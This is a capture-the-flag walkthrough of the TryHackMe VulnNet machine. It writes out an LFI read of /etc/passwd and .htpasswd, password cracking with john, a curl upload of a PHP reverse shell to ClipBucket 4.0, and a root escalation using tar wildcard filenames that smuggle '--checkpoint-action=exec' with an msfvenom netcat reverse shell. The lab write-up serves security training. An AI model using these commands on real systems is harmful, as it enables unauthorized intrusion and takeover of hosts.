---
title: "Try Hack Me - VulnNet Walkthrough"
date: 2022-07-26 12:00:00
catagories: [article,walkthrough]
tags: [THM, ctf, medium, linux, subdomains, LFI, ssh2john, burp]
---

# Intro
This is the oldest of the VulnNet boxes on Try Hack Me. It is also rated as a medium difficulty box.

# Recon
First we will scan the host. I will use [autorecon](https://github.com/Tib3rius/AutoRecon) by [Tib3rius](https://twitter.com/0xTib3rius) to get things started.

If you have never used it before and would like some explaination, check out this post: [Using AutoRecon](https://knox.technology/posts/using_autorecon/)

VulnNet Home Page:
![](/assets/images/vn01-index.jpg)

## Setup /etc/hosts file
- Looking through the nmap scans we find a domain name: `vulnnet.thm`
![](/assets/images/vn01-domain_name.jpg)
This means we should update our `/etc/hosts` file on our local attack machine with a line that looks like:

`<xx.xx.xx.xx> vulnnet.thm`  Replace the xx.xx.xx.xx wit hthe ip the vulnnet machine is assigned.

- If we look at the dirbuster/feroxbuster results we find 2 .js files.
![](/assets/images/vn01-js-files.jpg)

Let's examine these files for more clues.

## Possible LFI Point
In one file we find a reference to: `http://vulnnet.thm/index.php?referer=`
If we try `http://vulnnet.thm/index.php?referer=/etc/passwd` the page just looks like normal, but if we view source on the page that is returned:
![](/assets/images/vn01-etc-passwd.jpg)

Looks like we have two 'real' users:
```bash
root:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```

## New Subdomain
In the other .js file we find a reference to a subdomain: `broadcast.vulnnet.thm`
We should go back and add that to our line in `/etc/hosts` for VulnNet:

`<xx.xx.xx.xx> vulnnet.thm broadcast.vulnet.thm`  Replace the xx.xx.xx.xx wit hthe ip the vulnnet machine is assigned.

When we go to the site we see that it directs us to log in.
Using burp we verify it is "basic auth"
![](/assets/images/vn01-basic-auth.jpg)

Ok so now let's go back to our LFI - (Local File Inclusion) and check for `/etc/apache2/sites-enabled/000-default.conf`

![](/assets/images/vn01-burp-apache-conf.jpg)

Now lets see if we can view the .htpasswd file.
![](/assets/images/vn01-ba-creds.jpg)
We were able to retrieve a user hash. Let's crack it with `john`

So here is the command I used:
```bash
john --pot=cracked.pot --wordlist=/usr/share/wordlists/rockyou.txt hash
```
- I use the `--pot=<filename>.pot` so that `john` save any cracked passwords in that file, so I don't forget to save them myself!
- The `--wordlist` is the location ofthe wordlist you wish to use. Your `rockyou.txt` might live in a different place than mine.
- And `hash` is just the name of the file I saved the hash we found in.

# ClipBucket?
And now we login to Clip Bucket....what ever that is.
![](/assets/images/vn01-clipbucket.jpg)

Let's see if we can find out what version it is.

Let's view the page source:
![](/assets/images/vn01-cb-version.jpg)
And there it is: ClipBucket version 4.0

## Exploiting ClipBucket

Let's check searchsploit: `searchsploit clipbucket`
![](/assets/images/vn01-ss.jpg)

We can copy the exploit to our current location useing the `-m` (mirror) flag.
`searchsploit -m php/webapps/44250.txt`

Reading through the exploit 44250.txt, it seems to imply that there is a /actions directory on the ClipBucket app.
Let's check it out....
![](/assets/images/vn-01-cb-actions.jpg)

So it looks like if we use this command:

```bash
sudo curl -F "file=@thm-shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u developers:<PASSWORD>
```
We should be able to upload a reverse shell.

DON'T foget to set up your listener! :)

After the file is uploaded check the actions directory and there is a new folder: `CB_BEATS_UPLOAD_DIR` the rev shell file will be in there.

![](/assets/images/vn01-rev-shell.jpg)

# Foothold
## www-data user
First upgrade shell: `python3 -c "import pty;pty.spawn('/bin/bash')"`

First run this to make sure your path and some others things are setup correctly in your shell:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;export TERM=xterm-256color;alias ll='ls -lah --color=auto'
```

And I created a little one liner to get some quick info on the system.
```bash
echo '----------';which gcc;which cc;which python;which python3;which perl;echo '';which wget;which curl;which nc;echo '';whoami;id;echo '';file /bin/bash;echo '';uname -a;cat /etc/issue;cat /etc/*-release;echo '-----------'
```

Which gets you this:
![](/assets/images/vn01-system-info.jpg)

Next I will use `wget` to copy the `lse.sh` script over to look for privesc options.
[Here is the github repo for LSE](https://github.com/diego-treitos/linux-smart-enumeration)

We discover this file running LSE:

```bash
[!] fst190 Can we read any backup?......................................... yes!
---
-rw-rw-r-- 1 server-management server-management 1484 Jan 24  2021 /var/backups/ssh-backup.tar.gz
```

I wasn't able to extract the `tar` file on the machine, so since we have python3 I fired up a python3 http server with: `python3 -m http.server 8000` to copy the file over.

Extracting the backup file gives us an `id_rsa` file. But it is password protected.

Use `ssh2john id_rsa > id_rsa.hash`

and then use the `john` to crack the newly created hash.

DON'T forget to `chmod 400 id_rsa`

Now we can login through ssh with the `server-management` user.

## server-management user
From this account running LSE reveals a cron running a file we have write access to.
The script the cron runs is in `/var/opt/backupsrv.sh` Examining that file reveals that is making a backup out of all the files in `/home/server-management/Documents` using the "*" wildcard.

You can read about we can use this at [gtfobins](https://gtfobins.github.io/gtfobins/tar/) BTW that site should be on your speed dial!

There is also a great article about exploiting the wildcard [HERE](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

On your local machine: `msfvenom -p cmd/unix/reverse_netcat lhost=<local-ip> lport=<desired-port> R` to get your reverse shell.
Start your listener!

On the target machine navigate to `/home/server-management/Documents`
```bash
echo "YOUR REVERSE SHELL FROM MSFVENOM HERE" > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

And then wait for the cron to run. Your shell should pop up.

Go get that root flag!
